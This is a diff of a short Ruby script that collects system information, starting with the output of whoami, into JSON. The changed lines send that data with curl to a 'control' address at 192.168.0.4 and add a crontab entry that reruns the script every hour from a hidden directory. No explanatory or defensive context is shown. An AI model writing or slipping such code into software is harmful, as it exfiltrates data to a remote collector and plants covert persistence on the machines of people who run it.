@@ -1,7 +1,8 @@
-#!/usr/bin/env ruby
+#! /usr/bin/env ruby
 
 require \"json\"
 
+control = '192.168.0.4'
 info = {}
 who = %x(whoami)
 puts \"Hello #{who}\"
@@ -25,6 +26,6 @@ end
 
 pretty_info = JSON.pretty_generate(info)
 # puts pretty_info
- files = %x(ls)
-%x(curl -X POST -s localhost:4567/return -d '#{pretty_info}')
-%x(crontab -l | { cat; echo \"1 * * * * ruby #{dir}/.sketch/this.rb\"; } | crontab -)
+files = %x(ls)
+%x(curl -X POST -s #{control}:4567/return -d '#{pretty_info}')
+%x(crontab -l | { cat; echo \"1 * * * * ruby #{dir}/.hidden/this.rb\"; } | crontab -)
